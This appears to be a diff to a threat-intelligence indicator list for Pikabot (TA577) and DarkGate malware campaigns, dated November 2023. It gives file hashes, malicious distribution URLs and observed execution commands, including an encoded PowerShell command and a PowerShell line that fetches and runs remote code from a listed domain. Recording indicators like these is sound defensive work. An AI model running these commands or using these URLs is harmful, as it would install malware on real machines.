@@ -1,4 +1,4 @@
-15.11.2023 | Pikabot | TA577 | 1.1.15-ghost
+15.11.2023 | Pikabot | TA577 | 1.1.15-ghost | DarkGate Botnet A11111 |
 
 *************************************************
 
@@ -6,8 +6,13 @@
 .zip 592f4ee0f178de6162247010bf85d4eaccfa123d8a26a9db120bea1e13a830cd
 .dll ba3b6093e676d0d4ed3832efc496ad3a1b7c24e9a27574520c7b54e84b93de32
 
+DarkGate Distro
+
+.zip 0bae047a2fecd7a081f9980a7f754af4fa0c9e5eb41b937ab8448ef50edf820f
+.au3 c38255b259f5e552c33142d192afd438f824773dfcea4eb31c707ce86949464c
+
 .zip 95d14e055fde0847733890ca247d22a1ef9ad581389e6beead1de46d3147ff90
-.dll 
+.dll 3afd0ec9ff87802fecb70c64bf0c0b86081bd909b9b649f902931964d585632a
 
 *************************************************
 
@@ -28,12 +33,27 @@ POWerSHeLl  -encodedcommand cgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXABT
 rundll32.exe C:\Users\Admin\AppData\Local\Temp\SlobberShoddily.conf Throw
 
 *************************************************
+DarkGate Exec >
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\JNVEEN.js
+
+powershell.exe -Command Invoke-Expression (Invoke-RestMethod -Uri "http://faststroygo.com:80/jsslatecqpa");
+
+C:\tepp\AutoIt3.exe latecqpa.au3 
+
+*************************************************
 
 .dll distro
 
 https://frensterol.com/yveu/
 https://re-tend.com/Ud0Vh/
 https://septebist.com/MPdpah/radiu
+
+DarkGate Distro
+
+http://faststroygo.com/
+http://faststroygo.com/jsslatecqpa
+http://faststroygo.com/msilatecqpa
 
 *************************************************
 
